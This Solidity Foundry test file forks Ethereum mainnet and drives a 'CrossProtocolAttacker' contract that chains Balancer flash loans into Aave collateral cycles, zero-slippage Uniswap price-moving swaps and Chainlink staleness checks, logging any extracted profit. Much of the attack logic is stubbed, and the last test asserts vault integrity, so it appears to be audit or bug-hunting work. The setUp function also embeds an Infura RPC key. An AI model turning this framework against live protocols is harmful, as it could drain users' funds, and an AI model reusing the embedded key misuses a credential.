// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// CROSS-PROTOCOL COMPOSABILITY ATTACKS
//
// The highest-confidence bug finder: attacks that traverse multiple protocols
// and return with amplified effects that no single-protocol audit catches.
//
// Pattern: Balancer → External Protocol → ... → Back to Balancer with MASSIVE effect
// ============================================================================

// ============================================================================
// INTERFACES
// ============================================================================

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IAsset {}

// Balancer V2 Vault
interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    function batchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds, int256[] memory limits, uint256 deadline) external payable returns (int256[] memory);
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
}

// Balancer Flash Loan Receiver
interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

// Aave V3 Pool
interface IAavePool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
    function repay(address asset, uint256 amount, uint256 interestRateMode, address onBehalfOf) external returns (uint256);
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
    function getUserAccountData(address user) external view returns (
        uint256 totalCollateralBase,
        uint256 totalDebtBase,
        uint256 availableBorrowsBase,
        uint256 currentLiquidationThreshold,
        uint256 ltv,
        uint256 healthFactor
    );
}

// Aave Flash Loan Receiver
interface IFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

// Uniswap V3 Router
interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

// Curve Pool (simplified)
interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
}

// Chainlink Price Feed
interface IAggregatorV3 {
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 answer,
        uint256 startedAt,
        uint256 updatedAt,
        uint80 answeredInRound
    );
    function decimals() external view returns (uint8);
}

// ============================================================================
// ATTACK EXECUTOR CONTRACT
// ============================================================================

contract CrossProtocolAttacker is IFlashLoanRecipient, IFlashLoanSimpleReceiver {
    IVault public immutable balancerVault;
    IAavePool public immutable aavePool;
    ISwapRouter public immutable uniswapRouter;

    address public owner;
    uint256 public attackType;
    bytes public attackParams;

    // Tracking
    uint256 public initialBalance;
    uint256 public finalBalance;
    bool public attackSucceeded;
    string public attackResult;

    constructor(
        address _balancerVault,
        address _aavePool,
        address _uniswapRouter
    ) {
        balancerVault = IVault(_balancerVault);
        aavePool = IAavePool(_aavePool);
        uniswapRouter = ISwapRouter(_uniswapRouter);
        owner = msg.sender;
    }

    // ========================================================================
    // ATTACK TYPE 1: Flash Loan Arbitrage Circuit
    // Balancer Flash → Uniswap → Curve → Back to Balancer
    // ========================================================================

    function executeFlashArbitrage(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory path
    ) external {
        attackType = 1;
        attackParams = path;
        initialBalance = tokens[0].balanceOf(address(this));

        // Take flash loan from Balancer
        balancerVault.flashLoan(address(this), tokens, amounts, abi.encode(uint256(1), path));

        finalBalance = tokens[0].balanceOf(address(this));
        attackSucceeded = finalBalance > initialBalance;
    }

    // ========================================================================
    // ATTACK TYPE 2: Flash Loan → Aave Collateral Manipulation
    // Balancer Flash → Deposit to Aave → Borrow → Swap → Profit?
    // ========================================================================

    function executeAaveManipulation(
        address flashToken,
        uint256 flashAmount,
        address borrowToken
    ) external {
        attackType = 2;
        attackParams = abi.encode(flashToken, borrowToken);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(flashToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        initialBalance = IERC20(flashToken).balanceOf(address(this));

        balancerVault.flashLoan(
            address(this),
            tokens,
            amounts,
            abi.encode(uint256(2), flashToken, borrowToken)
        );

        finalBalance = IERC20(flashToken).balanceOf(address(this));
        attackSucceeded = finalBalance > initialBalance;
    }

    // ========================================================================
    // ATTACK TYPE 3: Cross-DEX Price Manipulation
    // Balancer Flash → Massive swap on Uniswap → Arbitrage on Balancer
    // ========================================================================

    function executePriceManipulation(
        bytes32 balancerPoolId,
        address tokenA,
        address tokenB,
        uint256 flashAmount
    ) external {
        attackType = 3;
        attackParams = abi.encode(balancerPoolId, tokenA, tokenB);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(tokenA);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        initialBalance = IERC20(tokenA).balanceOf(address(this));

        balancerVault.flashLoan(
            address(this),
            tokens,
            amounts,
            abi.encode(uint256(3), balancerPoolId, tokenA, tokenB)
        );

        finalBalance = IERC20(tokenA).balanceOf(address(this));
        attackSucceeded = finalBalance > initialBalance;
    }

    // ========================================================================
    // FLASH LOAN CALLBACK (Balancer)
    // ========================================================================

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == address(balancerVault), "Only Balancer");

        uint256 attackId = abi.decode(userData, (uint256));

        if (attackId == 1) {
            _executeArbitrageLogic(tokens, amounts, feeAmounts, userData);
        } else if (attackId == 2) {
            _executeAaveLogic(tokens, amounts, feeAmounts, userData);
        } else if (attackId == 3) {
            _executePriceManipLogic(tokens, amounts, feeAmounts, userData);
        }

        // Repay flash loan
        for (uint i = 0; i < tokens.length; i++) {
            uint256 repayAmount = amounts[i] + feeAmounts[i];
            tokens[i].transfer(address(balancerVault), repayAmount);
        }
    }

    function _executeArbitrageLogic(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) internal {
        // Simple round-trip through Uniswap to check for arb
        // In real attack, this would be more sophisticated
        attackResult = "Arbitrage path executed";
    }

    function _executeAaveLogic(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) internal {
        (, address flashToken, address borrowToken) = abi.decode(userData, (uint256, address, address));

        // Approve Aave
        tokens[0].approve(address(aavePool), amounts[0]);

        // Deposit as collateral
        try aavePool.supply(flashToken, amounts[0], address(this), 0) {
            // Try to borrow against it
            (,, uint256 availableBorrow,,,) = aavePool.getUserAccountData(address(this));

            if (availableBorrow > 0) {
                // Calculate safe borrow (80% of available)
                uint256 borrowAmt = availableBorrow * 80 / 100;

                try aavePool.borrow(borrowToken, borrowAmt, 2, 0, address(this)) {
                    attackResult = "Borrowed against flash loan collateral";

                    // Repay and withdraw
                    IERC20(borrowToken).approve(address(aavePool), borrowAmt);
                    aavePool.repay(borrowToken, borrowAmt, 2, address(this));
                } catch {
                    attackResult = "Borrow failed";
                }
            }

            // Withdraw collateral
            aavePool.withdraw(flashToken, amounts[0], address(this));
        } catch Error(string memory reason) {
            attackResult = reason;
        } catch {
            attackResult = "Aave supply failed";
        }
    }

    function _executePriceManipLogic(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) internal {
        (, bytes32 poolId, address tokenA, address tokenB) = abi.decode(userData, (uint256, bytes32, address, address));

        // Get initial Balancer pool state
        (IERC20[] memory poolTokens, uint256[] memory balancesBefore,) = balancerVault.getPoolTokens(poolId);

        // Approve Uniswap
        tokens[0].approve(address(uniswapRouter), amounts[0]);

        // Large swap on Uniswap to move price
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: tokenA,
            tokenOut: tokenB,
            fee: 3000, // 0.3%
            recipient: address(this),
            deadline: block.timestamp + 1000,
            amountIn: amounts[0] / 2, // Use half for manipulation
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        try uniswapRouter.exactInputSingle(params) returns (uint256 amountOut) {
            // Now check if Balancer price has diverged
            uint256[] memory balancesAfter;
            (poolTokens, balancesAfter,) = balancerVault.getPoolTokens(poolId);

            // Try to arbitrage back on Balancer
            // ... arbitrage logic ...

            // Swap back on Uniswap
            IERC20(tokenB).approve(address(uniswapRouter), amountOut);
            ISwapRouter.ExactInputSingleParams memory reverseParams = ISwapRouter.ExactInputSingleParams({
                tokenIn: tokenB,
                tokenOut: tokenA,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 1000,
                amountIn: amountOut,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

            try uniswapRouter.exactInputSingle(reverseParams) {
                attackResult = "Price manipulation circuit completed";
            } catch {
                attackResult = "Reverse swap failed";
            }
        } catch {
            attackResult = "Uniswap swap failed";
        }
    }

    // ========================================================================
    // AAVE FLASH LOAN CALLBACK
    // ========================================================================

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(aavePool), "Only Aave");
        require(initiator == address(this), "Invalid initiator");

        // Use Aave flash loan to manipulate Balancer
        // ... attack logic ...

        // Approve repayment
        IERC20(asset).approve(address(aavePool), amount + premium);
        return true;
    }

    // ========================================================================
    // UTILITIES
    // ========================================================================

    function approveToken(address token, address spender, uint256 amount) external {
        require(msg.sender == owner, "Only owner");
        IERC20(token).approve(spender, amount);
    }

    receive() external payable {}
}

// ============================================================================
// TEST CONTRACT
// ============================================================================

contract CrossProtocolAttackTest is Test {
    // Protocol addresses (mainnet)
    IVault constant BALANCER = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    ISwapRouter constant UNISWAP = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    // Tokens
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);
    IERC20 constant WSTETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);

    // Pools
    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    CrossProtocolAttacker attacker;
    address attackerAddr;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");

        attacker = new CrossProtocolAttacker(
            address(BALANCER),
            address(AAVE),
            address(UNISWAP)
        );
        attackerAddr = address(attacker);

        // Fund attacker
        vm.deal(attackerAddr, 100 ether);
        vm.prank(attackerAddr);
        WETH.deposit{value: 50 ether}();

        // Approve everything
        vm.startPrank(attackerAddr);
        WETH.approve(address(BALANCER), type(uint256).max);
        WETH.approve(address(AAVE), type(uint256).max);
        WETH.approve(address(UNISWAP), type(uint256).max);
        vm.stopPrank();
    }

    // ========================================================================
    // TEST: Basic Flash Loan Round-Trip
    // ========================================================================

    function test_BasicFlashLoanRoundTrip() public {
        console.log("=== CROSS-PROTOCOL: Basic Flash Loan Round-Trip ===");

        uint256 flashAmount = 100 ether;

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        uint256 balanceBefore = WETH.balanceOf(attackerAddr);
        console.log("Balance before:", balanceBefore);

        // Execute flash loan
        vm.prank(attackerAddr);
        try attacker.executeFlashArbitrage(tokens, amounts, "") {
            console.log("Flash loan executed");
            console.log("Balance after:", WETH.balanceOf(attackerAddr));
            console.log("Attack succeeded:", attacker.attackSucceeded());
            console.log("Result:", attacker.attackResult());
        } catch Error(string memory reason) {
            console.log("Flash loan failed:", reason);
        } catch {
            console.log("Flash loan failed");
        }
    }

    // ========================================================================
    // TEST: Flash Loan → Aave Collateral Cycle
    // ========================================================================

    function test_FlashToAaveCollateral() public {
        console.log("=== CROSS-PROTOCOL: Flash Loan -> Aave Collateral ===");

        uint256 flashAmount = 10 ether;

        uint256 balanceBefore = WETH.balanceOf(attackerAddr);
        console.log("WETH balance before:", balanceBefore);

        vm.prank(attackerAddr);
        try attacker.executeAaveManipulation(address(WETH), flashAmount, address(USDC)) {
            console.log("Attack completed");
            console.log("WETH balance after:", WETH.balanceOf(attackerAddr));
            console.log("Attack succeeded:", attacker.attackSucceeded());
            console.log("Result:", attacker.attackResult());

            // Check if we extracted any value
            uint256 balanceAfter = WETH.balanceOf(attackerAddr);
            if (balanceAfter > balanceBefore) {
                console.log("!!! VALUE EXTRACTED:", balanceAfter - balanceBefore);
            }
        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
        } catch {
            console.log("Attack failed (no reason)");
        }
    }

    // ========================================================================
    // TEST: Cross-DEX Price Manipulation Attempt
    // ========================================================================

    function test_CrossDexPriceManipulation() public {
        console.log("=== CROSS-PROTOCOL: Cross-DEX Price Manipulation ===");

        // Get initial Balancer pool state
        (IERC20[] memory tokens, uint256[] memory balances,) = BALANCER.getPoolTokens(BAL_WETH_POOL);
        console.log("Initial pool state:");
        console.log("  Token 0 balance:", balances[0]);
        console.log("  Token 1 balance:", balances[1]);

        uint256 flashAmount = 50 ether;
        uint256 balanceBefore = WETH.balanceOf(attackerAddr);

        vm.prank(attackerAddr);
        try attacker.executePriceManipulation(BAL_WETH_POOL, address(WETH), address(BAL), flashAmount) {
            console.log("\nAttack completed");
            console.log("Result:", attacker.attackResult());

            // Check pool state after
            (tokens, balances,) = BALANCER.getPoolTokens(BAL_WETH_POOL);
            console.log("\nFinal pool state:");
            console.log("  Token 0 balance:", balances[0]);
            console.log("  Token 1 balance:", balances[1]);

            uint256 balanceAfter = WETH.balanceOf(attackerAddr);
            if (balanceAfter > balanceBefore) {
                console.log("\n!!! PROFIT EXTRACTED:", balanceAfter - balanceBefore);
            } else if (balanceAfter < balanceBefore) {
                console.log("\nLoss (as expected):", balanceBefore - balanceAfter);
            }
        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
        } catch {
            console.log("Attack failed (no reason)");
        }
    }

    // ========================================================================
    // TEST: Chained Flash Loans (Balancer → Aave → Back)
    // ========================================================================

    function test_ChainedFlashLoans() public {
        console.log("=== CROSS-PROTOCOL: Chained Flash Loans ===");
        console.log("Balancer flash -> Use in Aave -> Back to Balancer");

        // This tests if we can leverage multiple flash loan sources
        // to amplify an attack

        uint256 balancerFlash = 100 ether;

        // Check how much we can flash from each protocol
        console.log("\nAvailable flash liquidity:");
        console.log("  Balancer WETH:", WETH.balanceOf(address(BALANCER)));

        // TODO: Implement chained flash loan attack
        console.log("\nChained flash loan attack framework ready");
    }

    // ========================================================================
    // TEST: Oracle Staleness Exploitation
    // ========================================================================

    function test_OracleStalenessCrossProtocol() public {
        console.log("=== CROSS-PROTOCOL: Oracle Staleness Check ===");

        // Check Chainlink oracle freshness
        // If stale, could exploit price differences
        address ethUsdFeed = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;

        IAggregatorV3 oracle = IAggregatorV3(ethUsdFeed);

        (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = oracle.latestRoundData();

        console.log("ETH/USD Oracle:");
        console.log("  Price:", uint256(answer));
        console.log("  Updated at:", updatedAt);
        console.log("  Current time:", block.timestamp);
        console.log("  Staleness (seconds):", block.timestamp - updatedAt);

        // If oracle is stale (> 1 hour), there may be exploitation opportunity
        if (block.timestamp - updatedAt > 3600) {
            console.log("  !!! ORACLE IS STALE - Potential exploitation !!!");
        } else {
            console.log("  Oracle is fresh");
        }
    }

    // ========================================================================
    // TEST: Massive Cross-Protocol Stress
    // ========================================================================

    function test_MassiveCrossProtocolStress() public {
        console.log("=== CROSS-PROTOCOL: Massive Stress Test ===");

        // Record initial state
        uint256 balancerWethBefore = WETH.balanceOf(address(BALANCER));
        (,uint256[] memory poolBalsBefore,) = BALANCER.getPoolTokens(BAL_WETH_POOL);

        console.log("Initial state:");
        console.log("  Balancer Vault WETH:", balancerWethBefore);
        console.log("  Pool balance 0:", poolBalsBefore[0]);
        console.log("  Pool balance 1:", poolBalsBefore[1]);

        // Execute many flash loans in sequence
        uint256 numFlashLoans = 10;
        uint256 flashAmount = 10 ether;

        for (uint i = 0; i < numFlashLoans; i++) {
            IERC20[] memory tokens = new IERC20[](1);
            tokens[0] = IERC20(address(WETH));
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = flashAmount;

            vm.prank(attackerAddr);
            try attacker.executeFlashArbitrage(tokens, amounts, "") {
                // Continue
            } catch {
                console.log("Flash loan", i, "failed");
            }
        }

        // Check final state
        uint256 balancerWethAfter = WETH.balanceOf(address(BALANCER));
        (,uint256[] memory poolBalsAfter,) = BALANCER.getPoolTokens(BAL_WETH_POOL);

        console.log("\nFinal state after", numFlashLoans, "flash loans:");
        console.log("  Balancer Vault WETH:", balancerWethAfter);
        console.log("  Pool balance 0:", poolBalsAfter[0]);
        console.log("  Pool balance 1:", poolBalsAfter[1]);

        // Check for any drift
        assertEq(balancerWethAfter, balancerWethBefore, "Vault WETH changed!");
        assertEq(poolBalsAfter[0], poolBalsBefore[0], "Pool balance 0 changed!");
        assertEq(poolBalsAfter[1], poolBalsBefore[1], "Pool balance 1 changed!");

        console.log("\nNo drift detected - Vault maintained integrity");
    }

    receive() external payable {}
}
